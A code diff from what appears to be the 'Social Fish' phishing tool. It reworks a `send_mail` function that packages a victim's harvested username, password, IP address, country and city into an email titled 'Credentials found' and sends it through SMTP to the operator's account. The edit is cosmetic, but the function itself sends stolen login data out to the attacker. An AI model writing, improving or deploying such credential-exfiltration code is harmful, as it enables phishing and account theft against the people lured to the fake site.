@@ -42,16 +42,23 @@ def connect_smtp(domain,port,login,passwd):
     except IndexError:
         return
 
-def send_mail(msg, url):
+def send_mail(msg, fish):
 
     msg_mail = 'Subject: Social Fish - Credentials found: {user}\r\n\r\n'.format(user=msg[0])
     msg_mail += '''
-    {site}
-    {user}
-    {passwd}
-    {ip}
-    {country}
-    {city}
-    '''.format(site=url, user=msg[0], passwd=msg[1], ip=msg[2], country=msg[3], city=msg[4]) 
+{site}
+{user}
+{passwd}
+{ip}
+{country}
+{city}
+    '''.format(
+            site=fish,
+            user=msg[0].strip(),
+            passwd=msg[1].strip(),
+            ip=msg[2].strip(),
+            country=msg[3].strip(),
+            city=msg[4].strip()
+            ) 
 
     smail = obj_smtp.sendmail(_login, _login, msg_mail.encode('ascii'))
